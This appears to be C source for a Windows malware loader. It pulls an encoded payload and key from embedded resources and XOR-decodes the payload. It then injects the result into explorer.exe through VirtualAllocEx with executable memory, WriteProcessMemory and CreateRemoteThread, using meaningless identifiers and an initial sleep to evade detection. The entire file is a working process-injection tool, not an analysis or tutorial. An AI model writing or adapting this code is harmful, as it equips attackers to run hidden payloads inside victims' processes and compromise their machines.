#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")
#include <tlhelp32.h>

void flacuaderes(const char* resName, char** data, DWORD* size) {
    HMODULE hModule = GetModuleHandle(NULL);
    HRSRC hResource = FindResource(hModule, resName, RT_RCDATA);

    HGLOBAL hResData = LoadResource(hModule, hResource);
    *size = SizeofResource(hModule, hResource);
    *data = (char*)LockResource(hResData);
}







void xcesgdecman(char* cod11d, DWORD lenofcod1, unsigned char* ke1su, DWORD k2e3y1en) {
    for (DWORD ma1su = 0; ma1su < lenofcod1; ma1su++) {
        cod11d[ma1su] ^= ke1su[ma1su % k2e3y1en]; 
    }
}


int main() {
    Sleep(2000);
    
    char* AESkey;
    DWORD AESkeyLen;
    flacuaderes("AESKEY", &AESkey, &AESkeyLen);

    char* AESCode;
    DWORD AESCodeLen;
    flacuaderes("AESCODE", &AESCode, &AESCodeLen);
    
    
    PROCESSENTRY32 pe32;
    
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    Process32First(snapshot, &pe32);
    const char *tarproces = "explorer.exe";
    while(Process32Next(snapshot, &pe32)) {
       if (strcmp(pe32.szExeFile, tarproces) == 0){
              HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
              
              LPVOID mellsloo = VirtualAllocEx(hProcess, NULL, AESCodeLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
              //dhanushaes(AESCode, AESCodeLen, AESkey, AESkeyLen);
              xcesgdecman(AESCode, AESCodeLen, AESkey , AESkeyLen);
             
              WriteProcessMemory(hProcess, mellsloo, AESCode, AESCodeLen, NULL);
             
             

             HANDLE tHandle = CreateRemoteThread(hProcess , NULL, 0, (LPTHREAD_START_ROUTINE)mellsloo, NULL, 0, NULL);
             WaitForSingleObject(tHandle, INFINITE);
             
              VirtualFreeEx(hProcess, mellsloo, 0, MEM_RELEASE);
           
              CloseHandle(tHandle);
           
              CloseHandle(hProcess);
              
              break;

         }
      }

    return 0;
}
